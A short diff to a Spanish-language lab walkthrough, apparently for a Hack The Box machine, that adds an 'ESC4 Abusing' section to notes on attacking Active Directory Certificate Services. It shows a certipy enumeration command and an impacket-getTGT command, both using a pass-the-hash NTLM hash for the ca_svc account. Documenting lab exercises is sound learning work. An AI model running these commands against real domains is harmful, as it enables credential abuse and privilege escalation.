@@ -315,7 +315,12 @@ Podemos buscar a que vulnerabilidades esta expuesto con
 certipy find -vulnerable -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.232.128 -stdout
 ```
 
-Y vemos que es vulnerable a `ESC4` que esta relaccionada con pertenecer al grupo `CERT PUBLISHER`
+Y vemos que es vulnerable a `ESC4` que esta relacionada con pertenecer al grupo `CERT PUBLISHER`
 ![[Pasted image 20260211205006.png]]
 
 ### ESC4 Abusing
+Obtenemos el TGT con [[IMPACKET]]
+```shell
+impacket-getTGT sequel.htb/ca_svc -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.232.128
+```
+
